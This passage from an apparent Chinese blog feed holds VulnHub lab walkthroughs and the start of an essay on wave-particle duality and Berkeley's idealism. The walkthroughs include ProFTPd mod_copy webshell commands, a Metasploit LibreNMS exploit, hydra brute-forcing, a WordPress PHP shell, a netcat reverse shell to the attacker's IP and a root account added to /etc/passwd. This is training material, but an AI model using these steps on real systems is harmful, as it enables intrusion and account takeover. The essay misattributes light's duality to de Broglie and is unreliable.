class="markdownIt-Anchor" href="#web路径扫描-18"></a> Web路径扫描</h2><p><code>dirb http://192.168.1.107/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/02.png" alt="" /></p><h2 id="漏洞利用-35"><a class="markdownIt-Anchor" href="#漏洞利用-35"></a> 漏洞利用</h2><p>收集smb信息<br /><code>enum4linux 192.168.1.107</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/03.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/04.png" alt="" /></p><p>目录/anonymous可以匿名访问，使用空账户即可登入<br />且获得用户名<code>aeolus</code>，<code>cronus</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/05.png" alt="" /></p><p>下载并查看<code>log.txt</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/06.png" alt="" /></p><p>内容为smb.conf与proftpd.conf<br />smb的<code>/anonymous</code>路径对应<code>/home/aeolus/share/</code><br />ftp存在匿名访问</p><p>尝试匿名访问FTP服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.1068.1.107</span><br><span class="line">anonymous</span><br><span class="line">anonymous</span><br><span class="line">site cpfr &#x2F;var&#x2F;backups&#x2F;shadow.bak</span><br><span class="line">site cpto &#x2F;home&#x2F;aeolus&#x2F;share&#x2F;shadow.bak</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/07.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/08.png" alt="" /></p><p>通过smb服务获取shadow的备份文件</p><p>使用john破解Hash</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/09.png" alt="" /></p><p>得到账户信息<code>aeolus:sergioteamo</code></p><p>使用账户信息登入SSH</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/10.png" alt="" /></p><h2 id="权限提升-35"><a class="markdownIt-Anchor" href="#权限提升-35"></a> 权限提升</h2><p>查看系统信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;*release</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/11.png" alt="" /></p><p>查看网络端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -antlp</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/12.png" alt="" /></p><p>目标对本地开放25，3306，8080端口</p><p>使用nc探测本地8080端口</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/13.png" alt="" /></p><p>本地8080端口存在Web服务</p><p>进行端口转发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-listen:1235,fork tcp-connect:localhost:8080 &amp;</span><br></pre></td></tr></table></figure><p>使用浏览器访问目标1235端口</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/14.png" alt="" /></p><p>使用<code>aeolus</code>账户进行登入</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/15.png" alt="" /></p><p>查询相关漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit librenms</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/16.png" alt="" /></p><p>使用MSF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit&#x2F;linux&#x2F;http&#x2F;librenms_addhost_cmd_inject</span><br><span class="line">set RHOST 192.168.1.107</span><br><span class="line">set RPORT 1235</span><br><span class="line">set USERNAME aeolus</span><br><span class="line">set PASSWORD sergioteamo</span><br><span class="line">set LHOST 192.168.1.103</span><br><span class="line">set LPORT 9999</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/17.png" alt="" /></p><p>获取tty</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>查看sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/18.png" alt="" /></p><p>进行sudo提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root mysql -e &#39;\! &#x2F;bin&#x2F;bash&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/19.png" alt="" /></p><hr /><blockquote><p>ProFRPd 1.3.5 mod_copy</p></blockquote><p>该模块允许未授权用户进行任意文件拷贝操作，配合SMB访问以及已知SMB路径即可完成任意文件下载/上传操作<br />该模块也存在写入Webshell的操作，具体操作如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">site cpfr &#x2F;proc&#x2F;self&#x2F;cmdline</span><br><span class="line">site cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php passthru($_GET[&#39;cmd&#39;]);?&gt;.php</span><br><span class="line">site cpfr &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php passthru($_GET[&#39;cmd&#39;]);?&gt;.php</span><br><span class="line">site cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php</span><br></pre></td></tr></table></figure><p>参考资料</p><blockquote><p><a href="https://blog.barradell-johns.com/index.php/2019/08/25/symfonos-two-writeup/">WalkThrough</a><br /><a href="https://www.exploit-db.com/exploits/37262">写入WebShell</a></p></blockquote><hr /><h1 id="fishymail"><a class="markdownIt-Anchor" href="#fishymail"></a> <a href="https://www.vulnhub.com/entry/fishymail-1,583/">FishyMail</a></h1><p><code>2020/11/04 20:52:24</code></p><h2 id="寻找靶机ip-20"><a class="markdownIt-Anchor" href="#寻找靶机ip-20"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/00.png" alt="" /></p><h2 id="端口扫描-36"><a class="markdownIt-Anchor" href="#端口扫描-36"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n</code></p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/01.png" alt="" /></p><h2 id="web路径扫描-19"><a class="markdownIt-Anchor" href="#web路径扫描-19"></a> Web路径扫描</h2><p><code>dirb http://192.168.1.103/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/02.png" alt="" /></p><h2 id="漏洞利用-36"><a class="markdownIt-Anchor" href="#漏洞利用-36"></a> 漏洞利用</h2><p>访问 <code>http://192.168.1.103:8080/robots.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow:</span><br><span class="line">&#x2F;spongebob</span><br><span class="line">&#x2F;dataentry</span><br><span class="line">&#x2F;fishymailer</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/03.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/04.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/05.png" alt="" /></p><p>继续枚举目录 <code>/dataentry/</code> 下的路劲</p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/06.png" alt="" /></p><p>枚举目录 <code>/dataentry/backup/admin/files/</code> 下的文件</p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/07.png" alt="" /></p><p>访问 <code>http://192.168.1.103:8080/dataentry/backup/admin/files/dir.txt</code></p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/08.png" alt="" /></p><p>对内容进行解码</p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/09.png" alt="" /></p><p>构造字典进行SSH爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat words1</span><br><span class="line">spongebob</span><br><span class="line">Sandy</span><br><span class="line">squidward</span><br><span class="line">0ctopus</span><br><span class="line">patrick</span><br><span class="line">chocolateflavoredWATER</span><br><span class="line">dirtysalmon </span><br><span class="line">chinook</span><br><span class="line">admin</span><br><span class="line">root</span><br><span class="line">user</span><br><span class="line">test</span><br><span class="line">pearl</span><br><span class="line">krabs</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -L words1 -P words1 ssh:&#x2F;&#x2F;192.168.1.103:2600</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/10.png" alt="" /></p><p>使用 <code>squidward</code> 账户登入SSH服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh squidward@192.168.1.103 -p 2600</span><br><span class="line">0ctopus</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/11.png" alt="" /></p><h2 id="权限提升-36"><a class="markdownIt-Anchor" href="#权限提升-36"></a> 权限提升</h2><p>查看信息<br /><code>cat /BikiniBottom-db.sql</code></p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/12.png" alt="" /></p><p>进行Base64解码</p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/13.png" alt="" /></p><p>在线MD5解密</p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/14.png" alt="" /></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">spongebob:sandy</span><br><span class="line">squidward:0ctopus</span><br><span class="line">patrick:</span><br><span class="line">dirtysalmon:crabby4eva</span><br><span class="line">Sandy:astronaut</span><br></pre></td></tr></table></figure><p>构造字典进行SSH爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat words2</span><br><span class="line">spongebob</span><br><span class="line">sandy</span><br><span class="line">squidward</span><br><span class="line">0ctopus</span><br><span class="line">patrick</span><br><span class="line">dirtysalmon</span><br><span class="line">crabby4eva</span><br><span class="line">Sandy</span><br><span class="line">astronaut</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -L words2 -P words2 ssh:&#x2F;&#x2F;192.168.1.103:2600</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/15.png" alt="" /></p><p>使用账户 <code>dirtysalmon</code> 登入SSH服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh dirtysalmon@192.168.1.103 -p 2600</span><br><span class="line">crabby4eva</span><br></pre></td></tr></table></figure><p>查看系统信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">OpenBSD fishymail.Home 6.6 GENERIC#353 amd64</span><br></pre></td></tr></table></figure><p>搜索相关提权漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit openbsd 6</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/16.png" alt="" /></p><p>进行提权操作</p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/17.png" alt="" /></p><hr /><blockquote><p>ksh</p></blockquote><p>squidward账户受到了ksh的限制，很多命令无法执行，尝试过切换成/bin/sh，但是无法实现</p><p>参考资料</p><blockquote><p><a href="https://grumpygeekwrites.wordpress.com/2020/10/27/fishymail-1-vulnhub-walk-through/">WalkThrough</a></p></blockquote><hr /><h1 id="hemisphere-lynx"><a class="markdownIt-Anchor" href="#hemisphere-lynx"></a> <a href="https://www.vulnhub.com/entry/hemisphere-lynx,577/">Hemisphere: Lynx</a></h1><p><code>2020/11/06 23:22:46</code></p><h2 id="寻找靶机ip-21"><a class="markdownIt-Anchor" href="#寻找靶机ip-21"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.56.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Hemisphere_Lynx/img/00.png" alt="" /></p><h2 id="端口扫描-37"><a class="markdownIt-Anchor" href="#端口扫描-37"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -T5 -v -n 192.168.56.104</code></p><p><img src="/images/vulnhub_walkthrough_set/Hemisphere_Lynx/img/01.png" alt="" /></p><h2 id="web路径扫描-20"><a class="markdownIt-Anchor" href="#web路径扫描-20"></a> Web路径扫描</h2><p><code>dirb http://192.168.56.104/</code></p><p><img src="/images/vulnhub_walkthrough_set/Hemisphere_Lynx/img/02.png" alt="" /></p><h2 id="漏洞利用-37"><a class="markdownIt-Anchor" href="#漏洞利用-37"></a> 漏洞利用</h2><p>枚举smb服务相关信息<br /><code>enum4linux 192.168.56.104</code></p><p><img src="/images/vulnhub_walkthrough_set/Hemisphere_Lynx/img/03.png" alt="" /></p><p>得到用户名 <code>johannes</code></p><p>访问 <code>http://192.168.56.104</code></p><p><img src="/images/vulnhub_walkthrough_set/Hemisphere_Lynx/img/04.png" alt="" /></p><p>获取网站文本内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http:&#x2F;&#x2F;192.168.56.104&#x2F; &gt; pass</span><br></pre></td></tr></table></figure><p>进行SSH爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -l johannes -P pass ssh:&#x2F;&#x2F;192.168.56.104</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[22][ssh] host: 192.168.56.104   login: johannes   password: constelaciones</span><br></pre></td></tr></table></figure><p>得到账户 <code>johannes:constelaciones</code></p><p>登入SSH服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh johannes@192.168.56.104</span><br><span class="line">constelaciones</span><br></pre></td></tr></table></figure><h2 id="权限提升-37"><a class="markdownIt-Anchor" href="#权限提升-37"></a> 权限提升</h2><p>查看桌面保存的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;home&#x2F;johannes&#x2F;Desktop&#x2F;.creds </span><br><span class="line">MjBLbDdpUzFLQ2FuaU84RFdNemg6dG9vcg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>进行Base64解码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo -n MjBLbDdpUzFLQ2FuaU84RFdNemg6dG9vcg&#x3D;&#x3D; | base64 -d</span><br><span class="line">20Kl7iS1KCaniO8DWMzh:toor</span><br></pre></td></tr></table></figure><p>逆序输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#39;print(&quot;20Kl7iS1KCaniO8DWMzh:toor&quot;[::-1])&#39;</span><br><span class="line">root:hzMWD8OinaCK1Si7lK02</span><br></pre></td></tr></table></figure><p>切换到root用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br><span class="line">hzMWD8OinaCK1Si7lK02</span><br></pre></td></tr></table></figure><hr /><h1 id="colddbox-easy"><a class="markdownIt-Anchor" href="#colddbox-easy"></a> <a href="https://www.vulnhub.com/entry/colddbox-easy,586/">ColddBox: Easy</a></h1><p><code>2020/11/06 13:06:15</code></p><h2 id="寻找靶机ip-22"><a class="markdownIt-Anchor" href="#寻找靶机ip-22"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.56.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/ColddBox_Easy/img/00.png" alt="" /></p><h2 id="端口扫描-38"><a class="markdownIt-Anchor" href="#端口扫描-38"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -T5 -v -n 192.168.56.106</code></p><p><img src="/images/vulnhub_walkthrough_set/ColddBox_Easy/img/01.png" alt="" /></p><h2 id="web路径扫描-21"><a class="markdownIt-Anchor" href="#web路径扫描-21"></a> Web路径扫描</h2><p><code>dirb http://192.168.56.106/</code></p><p><img src="/images/vulnhub_walkthrough_set/ColddBox_Easy/img/02.png" alt="" /></p><h2 id="漏洞利用-38"><a class="markdownIt-Anchor" href="#漏洞利用-38"></a> 漏洞利用</h2><p>使用wpscan进行用户名枚举</p><p><code>wpscan --url http://192.168.56.106 -e u</code></p><p><img src="/images/vulnhub_walkthrough_set/ColddBox_Easy/img/03.png" alt="" /></p><p>使用wpscan进行账户爆破</p><p><code>wpscan --url http://192.168.56.106 -e u -t 50 -P /usr/share/wordlists/FuzzDicts-master/passwordDict/top1000.txt</code></p><p><img src="/images/vulnhub_walkthrough_set/ColddBox_Easy/img/04.png" alt="" /></p><p>使用账户 <code>c0ldd:9876543210</code> 进行登入<br /><code>http://192.168.56.106/wp-login.php</code></p><p>登入之后进行修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Appearance -&gt; Editor -&gt; 404.php</span><br></pre></td></tr></table></figure><p>插入PHPShell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;</span><br></pre></td></tr></table></figure><p>验证Shell<br />访问 <code>http://192.168.56.106/?p=2&amp;cmd=whoami</code> ，得到回显 <code>www-data</code></p><p>监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9900</span><br></pre></td></tr></table></figure><p>反弹Shell<br />访问<br /><code>http://192.168.56.106/?p=2&amp;cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.56.103%209900%20%3E%2Ftmp%2Ff</code></p><h2 id="权限提升-38"><a class="markdownIt-Anchor" href="#权限提升-38"></a> 权限提升</h2><p>查看数据库配置信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;www&#x2F;html&#x2F;wp-config.php</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/ColddBox_Easy/img/05.png" alt="" /></p><p>得到数据库账户 <code>c0ldd:cybersecurity</code></p><p>尝试使用该账户登入SSH服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh c0ldd@192.168.56.106</span><br><span class="line">cybersecurity</span><br></pre></td></tr></table></figure><p>登入成功</p><p>查看SUDO权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/ColddBox_Easy/img/07.png" alt="" /></p><p>生成Hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -6 hackforfun</span><br><span class="line">$6$bCV9&#x2F;Q0G2hJVB579$PPqUpRwZ30NbVukP6UNGBv7torHFc1cQTs7XqgDT1x71w1xx36V.jG15pE8d1rcw&#x2F;qt3Bfr.xzZ3eFtpMJEs9.</span><br></pre></td></tr></table></figure><p>以root身份修改文件 <code>/etc/passwd</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root &#x2F;usr&#x2F;bin&#x2F;vim &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>插入如下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test:$6$bCV9&#x2F;Q0G2hJVB579$PPqUpRwZ30NbVukP6UNGBv7torHFc1cQTs7XqgDT1x71w1xx36V.jG15pE8d1rcw&#x2F;qt3Bfr.xzZ3eFtpMJEs9.:0:0::&#x2F;:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>切换至账户 <code>test</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su test</span><br><span class="line">hackforfun</span><br></pre></td></tr></table></figure><p>即可获得root权限</p><hr /><p>参考资料</p><blockquote><p><a href="https://sevenlayers.com/index.php/377-vulnhub-colddbox-easy-walkthrough">WalkThrough</a></p></blockquote><hr /><p>EOF</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;迟来的文章&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="Vulnhub" scheme="https://yoloyolo.top/tags/Vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>光的波粒二象性理论与存在即被感知理论的联系分析</title>
    <link href="https://yoloyolo.top/2023/02/07/An-Analysis-of-the-Connection-between-the-Wave-Particle-Duality-Theory-of-Light-and-the-Theory-of-Being-is-Perceived/"/>
    <id>https://yoloyolo.top/2023/02/07/An-Analysis-of-the-Connection-between-the-Wave-Particle-Duality-Theory-of-Light-and-the-Theory-of-Being-is-Perceived/</id>
    <published>2023-02-07T03:18:30.000Z</published>
    <updated>2023-07-16T09:04:12.647Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h2><h3 id="光的波粒二象性理论与存在即被感知理论概述"><a class="markdownIt-Anchor" href="#光的波粒二象性理论与存在即被感知理论概述"></a> 光的波粒二象性理论与存在即被感知理论概述</h3><p>光的波粒二象性理论和存在即被感知理论分别是物理学和哲学中两个重要且相互关联的概念。光的波粒二象性理论是量子力学的核心原理，它描述了光既是波又是粒子的双重性质。另一方面，存在即被感知理论是一种哲学思想，表明存在或现实只能通过观察者或意识来感知。</p><h3 id="研究目的及意义"><a class="markdownIt-Anchor" href="#研究目的及意义"></a> 研究目的及意义</h3><p>本研究的目的是检验这两种理论之间的关系，并探讨它们对我们理解现实的影响。光的波粒二象性理论已得到广泛研究和实验证明，并被广泛接受为物理学的基本原理。与此同时，存在即被感知理论已经被哲学家们讨论和争论了几个世纪，但它仍然是一个不断探索和探究的话题。</p><p>这两个理论之间的联系意义重大，因为它为我们理解现实的本质提供了新的思路。光的波粒二象性理论表明，光可以表现出波状和粒子状两种特性，这取决于它被观察或测量的方式。同时，存在即被感知理论表明，存在只能通过意识来感知。当一起考虑时，这些理论表明现实的本质可能是内在主观的，并且它会受到观察或感知方式的影响。</p><p>除了对我们理解现实的影响之外，光的波粒二象性理论与存在即被感知理论之间的这种联系还有可能影响其他研究领域。例如，它可能对意识研究领域有影响，因为它表明意识可能在塑造现实的本质方面发挥作用。同样，这种联系也可能对人工智能和机器学习领域产生影响，因为它提出了关于意识、感知和现实之间关系的问题。</p><p>总的来说，光的波粒二象性理论与存在即被感知理论之间的关系是一个不断探索和探究的课题。通过对这种联系的更深入理解，我们或许能够获得对现实本质的新见解，并探索这些理论对其他研究领域的影响。本研究旨在为这种正在进行的探索和探究做出贡献，并加深我们对这两个重要理论之间联系的理解。</p><a id="more"></a><h2 id="光的波粒二象性理论"><a class="markdownIt-Anchor" href="#光的波粒二象性理论"></a> 光的波粒二象性理论</h2><h3 id="理论的历史发展"><a class="markdownIt-Anchor" href="#理论的历史发展"></a> 理论的历史发展</h3><p>光的波粒二象性理论最早由路易斯·德布罗意(Louis de Broglie)在20世纪初提出。该理论是作为对光的波模型和粒子模型之间长期争论的回应而发展起来的，这种争论自从发现光本身以来就一直存在。粒子模型首先发展起来，艾萨克·牛顿爵士提出光是由粒子组成的，而波动模型是后来发展起来的，克里斯蒂安·惠更斯和托马斯·杨提出光是一种波。</p><p>光的波粒二象性理论是理解光的本质的重大突破，解决了光的波粒模型之间长期存在的争论。该理论认为，光可以表现出波状和粒子状行为，具体取决于观察方式。著名的双缝实验进一步证实了这一理论，该实验表明光在通过两个狭缝时可以表现出波状干涉图案，但在被检测到时也可以表现出粒子状行为。</p><h3 id="理论基础和原理"><a class="markdownIt-Anchor" href="#理论基础和原理"></a> 理论基础和原理</h3><p>光的波粒二象性理论的理论基础植根于量子力学。在量子力学中，粒子被描述为波函数，它们的行为由波粒二象性描述。该理论假定粒子的行为取决于它们被观察的方式，并且它们可以表现出波状或粒子状行为，这取决于它们被检测到的方式。</p><p>光的波粒二象性理论基于叠加的概念，即一个粒子可以同时以多种状态存在。这个想法与经典物理学相反，经典物理学假设粒子以确定的状态存在，并且可以确定地预测它们的行为。在量子力学中，粒子被描述为概率波，它们的行为只能根据概率来预测。</p><h3 id="实验证据和论证"><a class="markdownIt-Anchor" href="#实验证据和论证"></a> 实验证据和论证</h3><p>光的波粒二象性理论已在大量实验中得到证实。其中最著名的是双缝实验，该实验由托马斯·杨(Thomas Young)于19世纪初首先进行。在这个实验中，光通过两个狭缝，在狭缝后面的屏幕上观察到由此产生的干涉图样。干涉图案表明光表现为波，波峰和波谷相互干涉以产生图案。</p><p>另一个证明光的波粒二象性理论的实验是光电效应。在这个实验中，光照射在金属表面上，电子从表面发射出来。检测到电子，发现它们的行为类似于粒子。这个实验表明，光可以表现出波状和粒子状两种行为，这取决于它是如何被观察到的。</p><p>这些实验以及其他许多实验为光的波粒二象性理论提供了有力的证据，并证实了其有效性。该理论一直是量子力学发展的核心，并已被纳入物理和工程的众多领域，包括电信和计算。光的波粒二象性理论仍然是物理学中最重要和最广泛研究的理论之一，其含义至今仍在继续探索和理解。</p><h2 id="存在即被感知理论"><a class="markdownIt-Anchor" href="#存在即被感知理论"></a> 存在即被感知理论</h2><p>存在即被感知理论认为，观察者感知对象和事件的方式决定了它们的真实性。换句话说，物体或事件的真实性取决于观察者及其对它的感知。这一理论植根于几千年前的哲学和宗教传统，但最著名的阐述是在 18 世纪初的哲学家乔治·伯克利(George Berkeley)。</p><p>伯克利对这一理论的论证基于这样一种观点，即存在的一切都必须以某种方式被感知。根据伯克利的说法，物体只存在于观察者的脑海中，而体验它们存在的唯一方式是通过感知。从这个意义上说，现实完全是主观的，客观世界是心灵创造的幻觉。</p><p>存在即被感知理论遭到了批评和支持，一些人认为它是对现实主观性的有力论证，而另一些人则认为它有缺陷且不合逻辑。然而，无论其哲学有效性如何，该理论在几个世纪以来一直被广泛讨论和争论，并对西方思想的发展产生了重大影响。</p><h3 id="与光的波粒二象性理论的比较"><a class="markdownIt-Anchor" href="#与光的波粒二象性理论的比较"></a> 与光的波粒二象性理论的比较</h3><p>光的波粒二象性理论和存在即被感知理论是相关的，因为它们都证明了物体的性质取决于观察方式。在光的波粒二象性理论的情况下，光的波状和粒子状特性取决于用于测量它们的观察方法。同样，在存在即被感知理论中，物体的真实性取决于观察者的感知。</p><p>然而，这两种理论之间存在重要差异。虽然光的波粒二象性理论已被实验证实并被科学界广泛接受，但存在即被感知理论更具争议性并受到批评。此外，光的波粒二象性理论为光的本质及其行为方式提供了具体的解释，而存在即被感知理论为现实的本质提供了更普遍的哲学解释。</p><h3 id="对理解现实本质的影响"><a class="markdownIt-Anchor" href="#对理解现实本质的影响"></a> 